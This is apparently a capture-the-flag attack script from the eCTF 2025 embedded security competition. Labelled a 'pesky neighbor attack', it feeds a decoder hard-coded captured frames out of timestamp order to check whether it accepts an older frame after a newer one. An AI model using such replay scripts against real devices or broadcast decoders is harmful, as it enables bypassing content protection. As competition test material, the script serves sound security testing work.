import time
import sys
import struct

from ectf25.utils.decoder import DecoderIntf

# Latest channel 0 frame
ch0_frame = {"channel": 0, "timestamp": 1786896910281505, "encoded": "00000000216b965b2c5906001555e529d28dedb27314bf127416bc48ce045cdc4494dd286dd75c277a389d9329b999054118a541f4384c14639c1219ebaa3fd44b95a32a3ffd71e55d6d95bbb6d0ba892d287244caffa0b52c785dcd35a29217309285f07a5f4e5cf1"}

# Earlier channel 1 frame
ch1_frame = {"channel": 1, "timestamp": 1786896906258479, "encoded": "010000002f08595b2c5906000a9d5eed0f3d3162fd3fb85bee7c9533a36bfa8ed6596e01d233524eb3e6ae16ad1b45bf3fd1f79572aec6674c13026429fc599c8acf18ce38ea47ede04b0c08b26a19c5c227679b0f89c69487728e2bdbcecdf5b0aed3a7a22e080d6a"}

def gen_subscription(device_id, start, end, channel):
    return struct.pack("<IQQI", device_id, start, end, channel)

if __name__ == "__main__":
    print("Running pesky neighbor attack")

    time.sleep(1)

    decoder = DecoderIntf(sys.argv[1])

    decoder.list()

    decoder.decode(bytes.fromhex(ch0_frame["encoded"]))

    decoder.decode(bytes.fromhex(ch1_frame["encoded"]))

    print("Successfully decoded earlier frame")
